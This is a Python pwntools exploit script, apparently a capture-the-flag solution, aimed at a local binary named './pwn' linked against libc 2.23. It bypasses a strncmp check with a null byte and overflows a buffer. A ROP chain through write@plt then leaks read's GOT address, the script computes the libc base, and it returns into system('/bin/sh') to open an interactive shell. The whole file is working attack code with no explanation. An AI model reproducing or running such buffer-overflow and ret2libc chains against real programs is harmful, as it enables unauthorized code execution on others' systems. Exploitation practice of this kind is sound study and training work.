# coding = 'utf-8'

from pwn import *

p = process("./pwn")
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
write_plt = elf.plt['write']
read_plt = elf.plt['read']
read_got = elf.got['read']
main_addr = 0x08048825
bin_sh_offset = next(libc.search("/bin/sh"))
bypass_strncmp = '\x00'
make_overflow = '\xff'*7
payload1 = bypass_strncmp + make_overflow
p.sendline(payload1)
p.recvuntil('Correct\n')

# leak the GOT_address of READ()
junk_bytes =  'a' * 0xE7
fake_ebp = 'jjkk'
ret_addr = p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x8)
payload2 = junk_bytes + fake_ebp + ret_addr
p.sendline(payload2)

read_addr = u32(p.recv(4))
print('read_addr: ', hex(read_addr))
libc_base = read_addr - libc.symbols['read']

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + bin_sh_offset

p.sendline(payload2)
p.recvuntil('Correct\n')

payload3 = junk_bytes + fake_ebp + p32(system_addr) + p32(bin_sh_addr)
p.sendline(payload3)

p.interactive()


